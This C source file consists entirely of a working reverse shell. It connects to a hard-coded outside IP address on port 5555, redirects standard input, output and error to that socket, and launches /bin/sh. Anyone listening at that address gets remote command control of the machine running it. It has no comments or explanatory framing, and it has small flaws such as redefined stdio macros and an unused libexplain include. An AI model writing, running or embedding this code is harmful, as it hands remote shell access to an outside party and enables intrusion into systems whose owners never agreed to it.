#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <libexplain/accept.h>
#include <arpa/inet.h>

#define stdin 0
#define stdout 1
#define stderr 2

int main(){
	
	int fd = 0;
	struct sockaddr_in serv_addr;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	
	memset ( &serv_addr, 0, sizeof(serv_addr) );

	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(5555);
	inet_pton ( AF_INET, "64.168.255.56", &serv_addr.sin_addr );

	connect ( fd, &serv_addr, sizeof(serv_addr) );

	dup2(fd, stdin);
	dup2(fd, stdout);
	dup2(fd, stderr);

	execve("/bin/sh", NULL, NULL);

	return 0;
}
